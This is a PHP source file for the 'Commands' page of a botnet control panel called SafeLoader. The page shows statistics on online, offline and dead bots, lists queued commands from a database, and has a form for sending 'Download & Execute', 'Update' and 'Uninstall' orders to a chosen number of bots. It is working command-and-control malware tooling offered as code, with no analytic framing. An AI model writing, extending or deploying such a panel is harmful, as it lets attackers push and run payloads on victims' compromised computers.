<?php
@session_start();

    if (!isset($_SESSION['login'])) {
        header('Location: index.php');
        exit();
    }
	
	include_once('includes/config.php');
	include_once('includes/stats.php');
	include_once('includes/update_bots.php');
?> 
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>SafeLoader - Commands</title>
        <meta charset="utf-8" />
        <link rel="stylesheet" type="text/css" href="css/main.css" />
    </head>
    <body>
        <aside>
            <h1><font style="text-shadow: 2px -2px 3px #2580A2, -2px -2px 3px #2580A2, -2px 2px 3px #2580A2, 2px 2px 3px #2580A2;">SafeLoader</font></h1>
            <nav>
                <ul>
                    <li class='first'>
                        <a href='stats.php'>Stats</a>
                    </li>
                    <li>
                        <a href='bots.php'>Bots</a>
                    </li>
                    <li>
                        <a class='active' href='commands.php'>Commands</a>
                    </li>
					<li>
                        <a href='includes/logout.php'>Logout</a>
                    </li>
                </ul>
           </nav>
		   <ul>
<?php
    echo '             <li class="title">General Statistics</li>' . PHP_EOL;
    echo '		       <li>Online Bots: ' . $onlinecount . '</li>' . PHP_EOL;
    echo '			   <li>Offline Bots: ' . $offlinecount . '</li>' . PHP_EOL;
    echo '			   <li>Dead Bots: ' . $deadcount . '</li>' . PHP_EOL;
    echo '			   <li>---------------------------------------------------</li>' . PHP_EOL;
    echo '			   <li>Total Bots: ' . $statustotal . '</li>' . PHP_EOL;
?>
		   </ul>
        </aside>
        <section class="stats">
            <article>
			    <center>
					<table id="bots">
                        <thead>
                   	        <tr>
                                <th>ID</th>
                                <th>Command</th>
								<th>Amount</th>
								<th>Finished</th>
								<th></th>
                             </tr>
                        </thead>
                        <tbody>
<?php
    $result = mysql_query('SELECT * FROM cmd');
    $num_rows = mysql_num_rows($result);

    while($row = mysql_fetch_array($result)) {
        echo '						    <tr>'.PHP_EOL;
        echo '								<td>#' . $row['id'] . '</td>'.PHP_EOL;
        echo '								<td>' . $row['cmd'] . '</td>'.PHP_EOL;
        echo '								<td>' . $row['amount'] . '</td>'.PHP_EOL;
        echo '								<td>' . $row['done'] . '</td>'.PHP_EOL;
        echo '								<td><a href="includes/delete_command.php?id=' . $row['id'] . '"><img src="images/delete.png"></a></td>'.PHP_EOL;
        echo '						    </tr>'.PHP_EOL;
    }
?>                      </tbody>
                    </table>
                    <form action="includes/send_command.php" method="post">
	                    <select name="command">
                            <option value="downexec">Download & Execute</option>
                            <option value="update">Update</option>
				    		<option value="uninstall">Uninstall</option>
                        </select> 
                        <input type="text" name="value" placeholder="Value" required="required" autocomplete="off" style="width:200px; margin-top:20px;" class="textbox" />
                        <input type="text" name="amount" placeholder="Amount" required="required" autocomplete="off" style="width:80px;" class="textbox" />
						<p><button type="submit" name="submit" value="Submit" class="cool">Submit</button></p>
                    </form>
			    </center>
            </article>
        </section>
    </body>
</html>

